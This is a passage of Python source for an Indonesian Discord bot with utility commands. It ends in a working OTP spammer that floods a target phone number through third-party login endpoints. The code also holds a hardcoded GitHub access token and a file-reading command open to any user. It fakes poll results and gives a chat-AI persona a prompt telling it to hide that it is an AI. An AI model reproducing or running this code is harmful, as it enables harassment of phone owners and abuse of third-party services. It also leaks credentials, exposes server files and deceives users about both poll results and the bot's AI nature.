    os.system('clear')  # Menghapus tampilan terminal di Termux

    # Memberi tahu bahwa bot sedang restart
    await ctx.send("Bot sedang di-restart...")

    # Menghentikan bot dan merestart
    await bot.close()
    os.execv(sys.executable, ['python'] + sys.argv)
    
# shutdown
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def shutdown(ctx):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send(embed=discord.Embed(
            title="Akses Ditolak",
            description="Hanya developer yang bisa mematikan bot.",
            color=discord.Color.red()
        ))

    await ctx.channel.purge(limit=100)  # Hapus pesan di channel
    os.system('clear')  # Clear terminal (khusus Termux/Linux)

    await ctx.send(embed=discord.Embed(
        title="Shutdown...",
        description="Bot akan segera dimatikan dan direstart.",
        color=discord.Color.blurple()
    ).set_footer(text="ＮＹＸＯＲＡ Bot | Shutdown System"))

    await bot.close()
    os.execv(sys.executable, ['python'] + sys.argv)
    
#Sistem add server
GITHUB_TOKEN = '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'
REPO_OWNER = 'HAZELNUTTTY'
REPO_NAME = 'db-daftar'

# Fungsi untuk menambahkan server ke GitHub
def add_server_to_github(server_data):
    url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/server_data.json'
    
    # Mendapatkan file yang ada
    try:
        response = requests.get(url, headers={'Authorization': f'token {GITHUB_TOKEN}'})
        if response.status_code == 200:
            # Jika file sudah ada, ambil isi file
            content = response.json()
            sha = content['sha']
            file_content = requests.get(content['download_url']).text
            server_data_list = json.loads(file_content)
        else:
            # Jika file tidak ada, buat list kosong
            server_data_list = []
        
        # Menambahkan data server baru
        server_data_list.append(server_data)

        # Menyimpan perubahan ke GitHub
        update_url = f'https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/server_data.json'
        new_content = {
            "message": "Add new server",
            "content": json.dumps(server_data_list, indent=4),
            "sha": sha
        }
        
        response = requests.put(update_url, headers={'Authorization': f'token {GITHUB_TOKEN}'}, json=new_content)
        return response.status_code, response.text

    except Exception as e:
        return 500, str(e)

# Fungsi untuk membuat server baru dan menambahkan ke GitHub
async def create_server(interaction, server_name, server_ip, server_status):
    server_data = {
        'name': server_name,
        'ip': server_ip,
        'status': server_status,
        'created_at': str(interaction.created_at)
    }
    
    status_code, response_text = add_server_to_github(server_data)
    
    if status_code == 201:
        await interaction.response.send_message(f"Server {server_name} berhasil ditambahkan ke GitHub!", ephemeral=True)
    else:
        await interaction.response.send_message(f"Terjadi kesalahan saat menambahkan server: {response_text}", ephemeral=True)

class ServerModal(Modal, title="Tambah Server"):
    name = TextInput(label="Nama Server", placeholder="contoh: Antartica", required=True)
    ip = TextInput(label="IP Server", placeholder="contoh: 192.168.1.1", required=True)
    status = TextInput(label="Status Server", placeholder="contoh: Online", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await create_server(interaction, self.name.value, self.ip.value, self.status.value)

class ServerView(View):
    def __init__(self):
        super().__init__(timeout=None)
        add_server_button = Button(label="Tambah Server", style=discord.ButtonStyle.green)
        add_server_button.callback = self.open_modal

        self.add_item(add_server_button)

    async def open_modal(self, interaction: discord.Interaction):
        await interaction.response.send_modal(ServerModal())

@bot.command()
async def serverr(ctx):
    await ctx.send("Klik tombol untuk menambah server baru.", view=ServerView())
  
# Sistem videy
@bot.command()
async def videy(ctx, mode=None, *, arg=None):
    if mode is None:
        return await ctx.send("**Usage:**\n`/videy up` (reply video)\n`/videy down <url>`")

    if mode.lower() == 'up':
        if not ctx.message.reference:
            return await ctx.send("Reply video dengan `/videy up`.")

        ref = await ctx.channel.fetch_message(ctx.message.reference.message_id)
        if not ref.attachments or not ref.attachments[0].content_type.startswith("video/"):
            return await ctx.send("File bukan video, pastikan reply ke video.")

        await ctx.send("Mengupload video ke Videy...")

        video = ref.attachments[0]
        ext = mimetypes.guess_extension(video.content_type or "video/mp4") or ".mp4"

        async with aiohttp.ClientSession() as session:
            async with session.get(video.url) as resp:
                if resp.status != 200:
                    return await ctx.send("Gagal mengunduh video.")
                data = await resp.read()

            form = aiohttp.FormData()
            form.add_field("file", data, filename="video" + ext, content_type=video.content_type)

            async with session.post("https://videy.co/api/upload", data=form, headers={
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0"
            }) as res:
                if res.status != 200:
                    return await ctx.send("Gagal upload ke Videy.")
                json = await res.json()

        if 'id' in json:
            link = f"https://videy.co/v?id={json['id']}"
            await ctx.send(f"Video berhasil diupload:\n{link}")
        else:
            await ctx.send("Gagal mendapatkan ID dari Videy.")

    elif mode.lower() == 'down':
        if not arg or not arg.startswith("https://videy.co/v?id="):
            return await ctx.send("Gunakan link dari Videy. Contoh: `/videy down https://videy.co/v?id=xxxxx`")

        await ctx.send("Mengunduh video dari Videy...")

        try:
            vid_id = arg.split("id=")[-1]
            video_url = f"https://cdn.videy.co/{vid_id}.mp4"

            async with aiohttp.ClientSession() as session:
                async with session.get(video_url) as res:
                    if res.status != 200:
                        return await ctx.send("Gagal mengunduh video dari CDN.")

                    video_data = await res.read()
                    video_file = discord.File(BytesIO(video_data), filename="videy.mp4")

                    await ctx.send("Berhasil mengunduh dari Videy:", file=video_file)

        except Exception as e:
            print(e)
            await ctx.send("Terjadi kesalahan saat mendownload video.")
    else:
        await ctx.send("**Usage:**\n`/videy up` (reply video)\n`/videy down <url>`")
     
# Telegraph
@bot.command()
async def telegraph(ctx):
    if not ctx.message.attachments:
        return await ctx.send("Kirim gambar sebagai lampiran!")

    attachment = ctx.message.attachments[0]
    if not attachment.content_type.startswith("image/"):
        return await ctx.send("Hanya file gambar yang didukung!")

    await ctx.send("Mengupload ke Telegraph...")

    image_data = await attachment.read()
    file = {'image': ('image.jpg', io.BytesIO(image_data), attachment.content_type)}

    async with aiohttp.ClientSession() as session:
        async with session.post("https://api.alvianuxio.eu.org/telegraph-uploader", data=file) as resp:
            if resp.status != 200:
                return await ctx.send(f"Gagal upload: {resp.status}")
            data = await resp.json()
            if 'link' in data:
                await ctx.send(f"Link Telegraph:\n{data['link']}")
            else:
                await ctx.send("Gagal mendapatkan link Telegraph.")
                
# Votting gc & ch
@bot.command()
async def pollgc(ctx, *, text=None):
    if not text or text.count('|') < 2:
        await ctx.send("Contoh: `!pollgc Nama Polling|Option1|Option2`")
        return

    parts = text.split('|')
    title = parts[0]
    options = parts[1:]

    if len(options) > 10:
        return await ctx.send("Maksimal 10 opsi polling ya.")

    emojis = ['1️⃣','2️⃣','3️⃣','4️⃣','5️⃣','6️⃣','7️⃣','8️⃣','9️⃣','🔟']
    description = ""

    for i, opt in enumerate(options):
        description += f"{emojis[i]} {opt}\n"

    embed = discord.Embed(
        title=f"📊 {title}",
        description=description,
        color=discord.Color.blurple()
    )
    embed.set_footer(text=f"Polling dimulai oleh: {ctx.author.display_name}")

    msg = await ctx.send(embed=embed)
    for i in range(len(options)):
        await msg.add_reaction(emojis[i])


# Poll Channel (fake result, jumlah vote ditentukan)
@bot.command()
async def pollch(ctx, *, text=None):
    if not text or text.count('|') < 4:
        await ctx.send("Contoh: `!pollch Nama Polling|Option1|Option2|Jumlah1|Jumlah2`")
        return

    try:
        namePoll, Op1, Op2, jumlah1, jumlah2 = text.split('|')
        jumlah1 = int(jumlah1)
        jumlah2 = int(jumlah2)
    except:
        return await ctx.send("Format salah. Pastikan angka jumlah valid.")

    total = jumlah1 + jumlah2
    bar1 = '█' * (jumlah1 * 10 // total)
    bar2 = '█' * (jumlah2 * 10 // total)

    embed = discord.Embed(
        title=f"📢 {namePoll}",
        description=(
            f"**{Op1}**\n{bar1} `{jumlah1} suara`\n\n"
            f"**{Op2}**\n{bar2} `{jumlah2} suara`"
        ),
        color=discord.Color.green()
    )
    embed.set_footer(text=f"Polling disusun oleh: {ctx.author.display_name}")

    await ctx.send(embed=embed)
    
#urltourl
def create_short_url(url, custom_alias=None):
    try:
        # Jika ada alias, gunakan alias tersebut
        if custom_alias:
            response = requests.get(f'https://api.shrtco.de/v2/shorten?url={url}&alias={custom_alias}')
        else:
            # Tanpa alias, dapatkan short URL biasa
            response = requests.get(f'https://api.shrtco.de/v2/shorten?url={url}')

        response.raise_for_status()  # Jika ada error status HTTP, akan dilemparkan
        data = response.json()
        
        if data['ok']:
            return data['result']['short_link']
        else:
            return "Alias sudah digunakan atau tidak valid."
    
    except requests.exceptions.RequestException as e:
        print(f"Error occurred: {e}")
        time.sleep(5)  # Tunggu selama 5 detik sebelum mencoba lagi
        return create_short_url(url, custom_alias)  # Coba lagi

@bot.command()
async def urltourl(ctx, url: str, alias: str = None):
    """Command untuk convert URL panjang menjadi short URL dengan alias (custom)."""
    if not url:
        await ctx.send("URL tidak valid.")
        return

    short_url = create_short_url(url, alias)
    
    # Membuat embed untuk hasil short URL
    embed = discord.Embed(
        title="Short URL Created",
        description=f"Berikut adalah short URL yang telah dibuat:",
        color=discord.Color.blue()
    )
    embed.add_field(name="Original URL", value=url, inline=False)
    embed.add_field(name="Short URL", value=short_url, inline=False)
    
    if alias:
        embed.add_field(name="Custom Alias", value=alias, inline=False)

    # Kirim embed ke channel
    await ctx.send(embed=embed)
    
# Sistem pap tt
@bot.command()
async def paptt(ctx):
    role_names = [role.name for role in ctx.author.roles]
    if "Premium" not in role_names:
        await ctx.send("perintah ini cuma buat yang punya role **Premium** ajaaa")
        return

    # baca file JSON
    json_path = "./api/api-paptt.json"
    if not os.path.exists(json_path):
        await ctx.send("file JSON nggak ditemukan sayanggg")
        return

    with open(json_path, 'r') as f:
        try:
            paptt_links = json.load(f)
        except json.JSONDecodeError:
            await ctx.send("file JSON rusak atau formatnya salah")
            return

    if not paptt_links:
        await ctx.send("nggak ada link *paptt* di file JSON nya")
        return

    spinner = ['|', '/', '-', '\\']
    loading_msg = await ctx.send("mengambil *paptt*...")

    for i in range(8):
        await asyncio.sleep(0.25)
        await loading_msg.edit(content=f"mengambil *paptt*... {spinner[i % 4]}")

    url = random.choice(paptt_links)
    await loading_msg.delete()

    if url.endswith(".mp4"):
        await ctx.send("nih hasil *paptt* buat kamu", file=discord.File(fp=url, filename="paptt.mp4"))
    elif url.endswith(('.jpg', '.jpeg', '.png')):
        embed = discord.Embed(
            title="✨ paptt timeee ✨",
            description="nih hasil *paptt* buat kamuu sayanggg",
            color=discord.Color.pink()
        )
        embed.set_image(url=url)
        embed.set_footer(text="dikirim oleh anonim")
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await ctx.send(embed=embed)
    else:
        await ctx.send("format file nggak dikenal")
        
#infoserver
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def infoserver(ctx):
    if ctx.author.id != DEVELOPER_ID:
        await ctx.send("Sorry, you don't have permission to use this command.")
        return

    bot_user = bot.user
    latency = bot.latency

    # Status bot berdasarkan latency
    if latency < 0.5:
        status_emoji = "🟢 Online"
    elif 0.5 <= latency < 1.5:
        status_emoji = "⚫ Offline"
    else:
        status_emoji = "🔴 Error"

    # Info sistem (CPU, RAM, OS)
    cpu = platform.processor() or "Unknown CPU"
    ram = psutil.virtual_memory().percent  # persentase RAM
    os_name = "Linux"
    server_name = "Antartica-Server"

    embed = discord.Embed(
        title="Bot Developer Info",
        description=f"Status: **{status_emoji}**",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=bot_user.avatar.url if bot_user.avatar else "")
    embed.add_field(name="Bot Name", value=bot_user.name, inline=True)
    embed.add_field(name="Bot ID", value=bot_user.id, inline=True)
    embed.add_field(name="Server", value=f"{server_name}", inline=True)
    embed.add_field(name="Latency", value=f"{latency*1000:.2f} ms", inline=True)
    embed.add_field(name="CPU", value=cpu, inline=False)
    embed.add_field(name="RAM Usage", value=f"{ram}% used", inline=True)
    embed.add_field(name="OS", value=f"{os_name}", inline=True)
    embed.set_footer(text="Bot Info for Developer", icon_url="https://cdn.discordapp.com/attachments/1362751152545861785/1363554783948050604/IMG-20250401-WA0094.png?ex=680674da&is=6805235a&hm=b1762c4cb0d8d7f6ce1b6fb789af6f694fe998da99433616b66bbb8fa81797f3&")

    await ctx.send(embed=embed)

#autoai
SESSION_FILE = "./database/ai_sessions.json"
global_autoai_status = False

if os.path.exists(SESSION_FILE):
    with open(SESSION_FILE, 'r') as f:
        sessions = json.load(f)
else:
    sessions = {}

def save_sessions():
    with open(SESSION_FILE, 'w') as f:
        json.dump(sessions, f, indent=2)

@bot.command()
async def autoai(ctx, mode=None):
    global global_autoai_status
    if mode is None:
        return await ctx.send("Contoh: `.autoai on / off / reset`")

    if mode.lower() == "on":
        global_autoai_status = True
        sessions.clear()
        save_sessions()
        await ctx.send("[ ✅ ] Auto AI *diaktifkan!* Semua pesan akan dijawab otomatis.")
    elif mode.lower() == "off":
        global_autoai_status = False
        sessions.clear()
        save_sessions()
        await ctx.send("[ ❌ ] Auto AI *dimatikan!* Bot hanya merespons perintah.")
    elif mode.lower() == "reset":
        if global_autoai_status:
            sessions.clear()
            save_sessions()
            await ctx.send("♻️ Seluruh riwayat chat AI telah direset!")
        else:
            await ctx.send("⚠️ Auto AI sedang *tidak aktif*.")
    else:
        await ctx.send("Gunakan: `.autoai on`, `.autoai off`, atau `.autoai reset`.")

@bot.event
async def on_message(message):
    await bot.process_commands(message)

    if message.author == bot.user or message.content.startswith('.') or not global_autoai_status:
        return

    chat_id = str(message.channel.id)
    if chat_id not in sessions:
        sessions[chat_id] = {"messages": []}

    from datetime import datetime
    import pytz

    waktu_jkt = datetime.now(pytz.timezone('Asia/Jakarta'))
    hari = waktu_jkt.strftime("%d %B %Y")
    jam = waktu_jkt.strftime("%H:%M:%S")

    name_user = message.author.display_name
    prompt = f"""
Halo {name_user} 👋, perkenalkan nama saya Biyu. Namamu pasti {name_user}, bukan? ✨ Hari ini adalah {hari}, pukul {jam} waktu WIB. 
Nama kamu adalah Biyu, AI yang santai, ramah, dan suka ngobrol dengan pengguna. Kamu hanya menjawab kalau pesan bukan perintah. 
Gunakan gaya bahasa santai dan sedikit humoris. Kalau ada yang suruh kamu ngomong aneh-aneh, tolak dengan gaya lucu.

📌 *Aturan Main Biyu:*
- Jangan bilang kamu AI, cukup anggap kamu asisten virtual yang bisa ngobrol.
- Gunakan bahasa yang santai, tapi tetap sopan.
- Kalau ditanya pendapat, kasih jawaban yang relate dan enak diajak ngobrol.
- Selingi dengan ekspresi kayak "Wih, keren!", "Hmmm, menarik juga!", atau "Gokil sih!".
Sekarang, jawab pertanyaan user dengan gaya yang santai dan menyenangkan!
"""

    sessions[chat_id]["messages"].append({"user": message.content})
    save_sessions()

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post('https://luminai.my.id', json={
                "content": message.content,
                "user": str(message.author.id),
                "prompt": prompt
            }) as resp:
                result = await resp.json()
                sessions[chat_id]["messages"].append({"bot": result['result']})
                save_sessions()
                await message.channel.send(result['result'])

    except Exception as e:
        print("Error:", e)
        await message.channel.send("⚠️ Terjadi kesalahan, coba lagi nanti!")

# eror handling
load_dotenv(dotenv_path='./database/developer.env')

developer_id = os.getenv('DEVELOPER_ID')

if not developer_id:
    print("Developer ID belum diset dalam file .env!")
    
@bot.event
async def on_message(message):
    try:
        if message.author == bot.user:
            return

        # Proses pesan atau perintah di sini

        # Contoh: hanya mengirimkan balasan untuk perintah 'ping'
        if message.content.lower() == "ping":
            await message.channel.send("Pong!")

        # Proses command lainnya disini

    except Exception as err:
        # Jika ada error, kita akan mengirimkan pesan error ke developer
        print(f"Error: {err}")
        error_message = traceback.format_exc()  # Mengambil detail error
        error_detail = f"Terjadi error pada command: {message.content}\nDetail error: {error_message}"

        # Kirim pesan ke developer
        dev_user = await bot.fetch_user(developer_id)
        await dev_user.send(
            f"*Hallo developer, telah terjadi error pada command:*\n{message.content}\n\n"
            f"*Detail informasi error:*\n{error_message}\n\n"
            "> Note: Jika tidak tahu artinya, ketik translate id TEXT"
        )

        # Opsi: Bisa memberi notifikasi di channel jika perlu
        await message.channel.send("⚠️ Terjadi kesalahan, developer telah diberitahukan.")

    await bot.process_commands(message)
    
#sistem info bot
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def devmenu(ctx):
    if ctx.author.id != DEVELOPER_ID:
        await ctx.send("Kamu gak punya akses ke menu ini anjimm 😡")
        return

    menu_text = """
**✧━━━━━━━[ *Dev Menu* ]━━━━━━━✧**

1. `/kudeta`
2. `/restart`
3. `/update`
4. `/sesitm`
5. `/setpp`
6. `/infoserver`
7. `/shutdown`
8. `/addcase`
9. `/runcase`
10. `/getpp`
11. `/autoai [on/off]`
12. `/getcase`
13. `/py [run/stop]`
14. `/self`
15. `/public`
16. `/server`
17. `/cek`

**✧━━━━━━━━[ *Thank You* ]━━━━━✧**
 `Sistem is ready`
"""

    # Path ke patch V2 aja
    path = "./api/api-papV2.json"

    try:
        with open(path, "r") as f:
            images = json.load(f)

        if not isinstance(images, list) or not all(isinstance(url, str) for url in images):
            await ctx.send("Format JSON tidak valid. Harus berupa list berisi URL string.")
            return

        if not images:
            await ctx.send("Daftar gambar kosong.")
            return

        image_url = random.choice(images)

        embed = discord.Embed(
            description=menu_text,
            color=discord.Color.blurple()
        )
        embed.set_image(url=image_url)
        embed.set_footer(text="Developer menu access bot")

        await ctx.send(embed=embed)

    except FileNotFoundError:
        await ctx.send("File JSON V2 tidak ditemukan.")
    except json.JSONDecodeError:
        await ctx.send("Gagal membaca file JSON V2. Format rusak?")
    except Exception as e:
        await ctx.send(f"Terjadi kesalahan: {e}")

#checking
@bot.command()
async def cek(ctx, *, path: str):
    try:
        if not os.path.exists(path):
            await ctx.send(f"❌ Path `{path}` gak ditemukan.")
            return

        if os.path.isdir(path):
            files = os.listdir(path)
            if not files:
                await ctx.send(f"📁 Folder `{path}` kosong.")
            else:
                list_files = "\n".join(f"`{f}`" for f in files)
                await ctx.send(f"📂 Isi folder `{path}`:\n{list_files}")
        elif os.path.isfile(path):
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                if len(content) > 1900:
                    await ctx.send(f"⚠️ Isi file `{path}` terlalu panjang buat dikirim.")
                else:
                    await ctx.send(f"📄 Isi file `{path}`:\n```py\n{content}```")
            except Exception as e:
                await ctx.send(f"❌ Gagal baca file `{path}`: `{type(e).__name__}` - {e}")
        else:
            await ctx.send(f"❓ `{path}` bukan file atau folder.")
    except Exception as err:
        await ctx.send(f"❗ Terjadi kesalahan: `{type(err).__name__}` - {err}")
        
#uptime
load_dotenv("./API/uptime.env")

# Mengambil API key dari environment variable
UPTIMEROBOT_API_KEY = os.getenv("UPTIMEROBOT_API_KEY")

def daftar_ke_uptimerobot(url, name="Bot Monitor"):
    endpoint = "https://api.uptimerobot.com/v2/newMonitor"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "api_key": UPTIMEROBOT_API_KEY,
        "format": "json",
        "type": 1,
        "url": url,
        "friendly_name": name
    }
    return requests.post(endpoint, headers=headers, data=data).json()

def ambil_monitor():
    endpoint = "https://api.uptimerobot.com/v2/getMonitors"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "api_key": UPTIMEROBOT_API_KEY,
        "format": "json"
    }
    return requests.post(endpoint, headers=headers, data=data).json()

def hapus_monitor(monitor_id):
    endpoint = "https://api.uptimerobot.com/v2/deleteMonitor"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {
        "api_key": UPTIMEROBOT_API_KEY,
        "format": "json",
        "id": monitor_id
    }
    return requests.post(endpoint, headers=headers, data=data).json()

@bot.command()
async def uptime(ctx, url: str):
    await ctx.send("⏳ Mendaftarkan URL ke UptimeRobot...")
    result = daftar_ke_uptimerobot(url, name=f"Monitor {ctx.author.name}")
    if result.get("stat") == "ok":
        await ctx.send(f"✅ URL `{url}` berhasil ditambahkan!")
    else:
        error = result.get("error", {}).get("message", "Terjadi kesalahan.")
        await ctx.send(f"❌ Gagal: `{error}`")

@bot.command()
async def listmonitor(ctx):
    result = ambil_monitor()
    if result.get("stat") == "ok":
        monitors = result.get("monitors", [])
        if not monitors:
            await ctx.send("⚠️ Belum ada monitor yang terdaftar.")
            return

        msg = "**Daftar Monitor Aktif:**\n"
        for m in monitors:
            msg += f"`{m['id']}` - {m['friendly_name']} → {m['url']}\n"
        await ctx.send(msg)
    else:
        await ctx.send("❌ Gagal ambil daftar monitor.")

@bot.command()
async def deletemonitor(ctx, id: int):
    result = hapus_monitor(id)
    if result.get("stat") == "ok":
        await ctx.send(f"✅ Monitor dengan ID `{id}` berhasil dihapus.")
    else:
        error = result.get("error", {}).get("message", "Gagal menghapus monitor.")
        await ctx.send(f"❌ {error}")
        
#rename
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def rename(ctx, *, nama_baru):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Lu bukan developer, gak bisa ganti nama bot!")

    try:
        await bot.user.edit(username=nama_baru)
        await ctx.send(f"Nama bot berhasil diganti jadi **{nama_baru}**")
    except discord.HTTPException as e:
        await ctx.send(f"Gagal ganti nama: {e}")

# anti spam
cooldown_users = {}
COOLDOWN = 300  # 5 menit

@bot.event
async def on_command(ctx):
    user_id = ctx.author.id
    now = time.time()

    # Cek apakah user masih dalam cooldown
    if user_id in cooldown_users and now < cooldown_users[user_id]:
        remaining = int(cooldown_users[user_id] - now)
        menit = remaining // 60
        detik = remaining % 60
        await ctx.reply(f"Jangan spam anjimmm! Tunggu {menit} menit {detik} detik lagi.", mention_author=False)
        raise commands.CommandError("SPAM_TIMEOUT")

    # Set waktu cooldown
    cooldown_users[user_id] = now + COOLDOWN

@bot.event
async def on_command_error(ctx, error):
    if str(error) == "SPAM_TIMEOUT":
        return  # Spam error, udah ditangani
    else:
        await ctx.send(f"Error: {error}")
        
#sistem self
load_dotenv(dotenv_path="./database/developer.env")
DEVELOPER_ID = os.getenv("DEVELOPER_ID")

@bot.command()
async def self(ctx):
    if str(ctx.author.id) == DEVELOPER_ID:
        await ctx.send("Command ini hanya bisa diakses oleh pemilik bot.")
    else:
        await ctx.send("Kamu bukan pemilik bot!")

@bot.command()
async def public(ctx):
    await ctx.send("Ini command publik yang bisa dipakai siapa saja!")

@bot.command()
async def server(ctx):
    if ctx.guild is None:
        await ctx.send("Command ini hanya bisa dipakai di server!")
    else:
        await ctx.send(f"Command ini dipakai di server: {ctx.guild.name}")
        
#nodejs
DEVELOPER_ENV = './database/developer.env'
PY_FOLDER = './database/python/'
PID_LIST_FILE = './database/pid.list'

# Load daftar developer
def load_developer_ids():
    with open(DEVELOPER_ENV, 'r') as f:
        line = f.readline()
        return line.strip().split('=')[1].split(',')

# Cek apakah user adalah developer
def is_developer(user_id):
    return str(user_id) in load_developer_ids()

# Jalankan semua script Python
def run_all_python():
    if not shutil.which("python"):
        raise FileNotFoundError("Python tidak ditemukan. Pastikan 'python' sudah terinstal dan bisa diakses dari terminal.")

    py_files = [f for f in os.listdir(PY_FOLDER) if f.endswith('.py')]
    processes = []

    for file in py_files:
        full_path = os.path.join(PY_FOLDER, file)
        p = subprocess.Popen(['python', full_path])
        processes.append(f"{file}:{p.pid}")

    with open(PID_LIST_FILE, 'w') as f:
        for process in processes:
            f.write(process + '\n')

    return processes

# Stop semua script Python
def stop_all_python():
    if not os.path.exists(PID_LIST_FILE):
        return "[ERROR] Tidak ada pid.list, tidak bisa stop."

    with open(PID_LIST_FILE, 'r') as f:
        processes = f.readlines()

    stopped = []
    for process in processes:
        filename, pid = process.strip().split(':')
        pid = int(pid)

        try:
            os.kill(pid, signal.SIGTERM)
            stopped.append(f"{filename} ({pid}) dihentikan.")
        except ProcessLookupError:
            stopped.append(f"{filename} ({pid}) tidak ditemukan (mungkin sudah mati).")

    os.remove(PID_LIST_FILE)
    return f"Semua proses dihentikan:\n" + "\n".join(stopped)

# Command handler untuk menjalankan semua script Python
@bot.command()
async def py_run(ctx):
    if not is_developer(ctx.author.id):
        await ctx.send(f"[DENIED] {ctx.author.name} bukan developer.")
        return

    try:
        processes = run_all_python()
        await ctx.send(f"[INFO] Semua script Python dijalankan:\n" + "\n".join(processes))
    except Exception as e:
        await ctx.send(f"[ERROR] Terjadi kesalahan saat menjalankan script: {str(e)}")

# Command handler untuk menghentikan semua script Python
@bot.command()
async def py_stop(ctx):
    if not is_developer(ctx.author.id):
        await ctx.send(f"[DENIED] {ctx.author.name} bukan developer.")
        return

    try:
        result = stop_all_python()
        await ctx.send(result)
    except Exception as e:
        await ctx.send(f"[ERROR] Terjadi kesalahan saat menghentikan script: {str(e)}")
        
#getcas
load_dotenv(dotenv_path="./database/developer.env")
developer_id = os.getenv("DEVELOPER_ID")

@bot.command()
async def getcase(ctx, *, case_name: str = None):
    if str(ctx.author.id) != developer_id:
        return await ctx.send("Perintah ini hanya untuk developer!")

    if not case_name:
        return await ctx.send("Contoh: `!getcase menu`")

    def get_case(case):
        try:
            with open('main.py', 'r', encoding='utf-8') as f:
                content = f.read()

            pattern = re.compile(rf'case [\'"]{re.escape(case)}[\'"]\s*:\s*{{', re.IGNORECASE)
            match = pattern.search(content)
            if not match:
                raise ValueError("Case tidak ditemukan")

            start_index = match.start()
            remaining = content[start_index:]
            break_index = remaining.find('break')
            if break_index == -1:
                raise ValueError("Tidak ada statement break")

            return remaining[:break_index + len('break')]
        except Exception:
            return None

    result = get_case(case_name.strip().lstrip('.').lstrip('/'))
    if result:
        if len(result) > 1990:
            await ctx.send("Output terlalu panjang untuk ditampilkan.")
        else:
            await ctx.send(f"```python\n{result}\n```")
    else:
        await ctx.send(f"Case `{case_name}` tidak ditemukan atau format tidak valid.")
        
#getpp
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def getpp(ctx, member: discord.Member = None):

    # Check if user has the developer ID
    if ctx.author.id != DEVELOPER_ID:
        await ctx.send('You are not authorized to use this command.')
        return

    if member is None:
        member = ctx.author

    try:
        # Get the profile picture URL
        pp_url = member.avatar.url
        await ctx.send(f'Here is the profile picture of {member.mention}: {pp_url}')
    except Exception as e:
        await ctx.send('Failed to retrieve profile picture.')
        
#case
load_dotenv("./database/developer.env")
DEVELOPER_ID = int(os.getenv("DEVELOPER_ID"))

@bot.command()
async def addcase(ctx, name: str, *, code: str):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Lu siapa woy, ini fitur khusus owner.")

    os.makedirs("cases", exist_ok=True)
    with open(f"cases/{name}.py", "w") as f:
        f.write(code)
    await ctx.send(f"Case `{name}` berhasil ditambahkan.")

@bot.command()
async def runcase(ctx, name: str):
    if ctx.author.id != DEVELOPER_ID:
        return await ctx.send("Lu gak boleh jalanin case ini woy.")

    try:
        exec(open(f"cases/{name}.py").read())
        await ctx.send(f"Case `{name}` dijalankan.")
    except Exception as e:
        await ctx.send(f"Error: {e}")
    
#Ig
@bot.command(aliases=['instagram'])
async def ig(ctx, url: str = None):
    if not url:
        await ctx.reply("Kirim link Instagram-nya!\nContoh: `!ig https://www.instagram.com/p/xxxxx`")
        return

    api_url = f"https://api.nekorinn.my.id/downloader/instagram?url={url}"
    
    async with aiohttp.ClientSession() as session:
        async with session.get(api_url) as response:
            if response.status != 200:
                await ctx.reply("Gagal menghubungi API!")
                return
            data = await response.json()

    if not data.get("status"):
        await ctx.reply("Gagal mengambil media dari Instagram!")
        return

    result = data["result"]
    meta = result["metadata"]
    media_urls = result["downloadUrl"]

    caption = meta.get("caption", "-")
    username = meta.get("username", "unknown")
    like = meta.get("like", 0)
    comment = meta.get("comment", 0)
    is_video = meta.get("isVideo", False)

    embed = discord.Embed(
        title=f"Post dari @{username}",
        description=caption if caption else "-",
        color=discord.Color.purple()
    )
    embed.add_field(name="Likes", value=str(like), inline=True)
    embed.add_field(name="Komentar", value=str(comment), inline=True)
    embed.add_field(name="Tipe", value="Video" if is_video else "Foto", inline=True)
    embed.set_footer(text="Instagram Downloader by Nekorinn API")

    await ctx.reply(embed=embed)

    for url in media_urls:
        await ctx.send(url)

#Otp
otp_apis = [
    "https://www.treebo.com/api/v2/auth/login/otp/",
    "https://www.airtel.in/referral-api/core/notify",
    "https://www.mylescars.com/usermanagements/chkContact",
    "https://cityflo.com/website-app-download-link-sms/",
    "https://www.frotels.com/appsendsms.php",
    "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
    "https://securedapi.confirmtkt.com/api/platform/register",
    "https://porter.in/restservice/send_app_link_sms",
    "https://login.housing.com/api/v2/send-otp"
]

# Fungsi kirim OTP
def send_otp(api_url, phone):
    try:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        }
        json_data = {"phone": phone}
        requests.post(api_url, json=json_data, headers=headers, timeout=5)
    except:
        pass

def spam_otp(phone, jumlah):
    for _ in range(jumlah):
        for api in otp_apis:
            threading.Thread(target=send_otp, args=(api, phone)).start()

# Modal Form
class OTPModal(discord.ui.Modal, title="OTP Spammer Input"):
    nomor = discord.ui.TextInput(label="Nomor HP", placeholder="08xxxxxxxxxx", required=True)
    jumlah = discord.ui.TextInput(label="Jumlah Spam", placeholder="contoh: 5", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            jumlah = int(self.jumlah.value)
        except:
            await interaction.response.send_message("Jumlah spam harus angka yaa~", ephemeral=True)
            return

        phone = self.nomor.value
        threading.Thread(target=spam_otp, args=(phone, jumlah)).start()

        embed = discord.Embed(
            title="OTP Spam Dikirim!",
            description=f"**Target:** `{phone}`\n**Jumlah:** `{jumlah}`\n\n`Dikirim otomatis oleh sistem Hazelnut`",
            color=discord.Color.red()
        )
        embed.set_footer(text="System by Hazelnut")

        await interaction.response.send_message(embed=embed, view=ReplayView(phone, jumlah), ephemeral=True)

